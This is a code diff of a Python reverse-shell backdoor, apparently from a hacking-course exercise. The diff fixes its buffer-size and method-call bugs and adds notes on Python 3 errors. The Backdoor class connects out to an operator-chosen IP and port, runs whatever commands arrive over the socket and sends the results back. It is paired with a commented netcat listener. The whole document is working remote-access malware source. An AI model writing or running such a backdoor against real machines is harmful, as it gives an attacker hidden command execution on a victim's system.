@@ -1,4 +1,5 @@
 #!/usr/bin/env python
+#needs debugging to work in python3 - bytes-like object error
 
 import socket, subprocess
 
@@ -7,7 +8,7 @@ import socket, subprocess
 #netcat --veryverbose -listen -port ####
 
 class Backdoor:
-    def __init__ (self, ip, port, buffer_size): #constructor method
+    def __init__ (self, ip, port): #constructor method
         self.connection = socket.socket(socket.AF_INET,  socket.SOCK_STREAM) #create instance of socket object
         self.connection.connect((ip, port)) #connect method from connection variable
         
@@ -16,8 +17,8 @@ class Backdoor:
     
     def run(self):
         while True:
-            command = self.connection.recv(buffer_size) #receive, specify buffer size
-            command_result = execute_system_command(command)
+            command = self.connection.recv(1024) #receive, specify buffer size
+            command_result = self.execute_system_command(command)
             self.connection.send(command_result)
         connection.close()
     
@@ -25,11 +26,11 @@ ip = raw_input("Enter IP Address: ")
 port = int(raw_input("Enter port number to use: "))
 buffer_size = int(raw_input("Enter buffer size: "))
 
-my_backdoor = Backdoor(ip, port, buffer_size)
+my_backdoor = Backdoor(ip, port)
 my_backdoor.run()
 
 #connection.send("\n++Connection established++\n") #python3 requires bytes-like object to be passed, not string
-
+############################################################################
 ############################################################################
 ###Commented code below###
 #!/usr/bin/env python
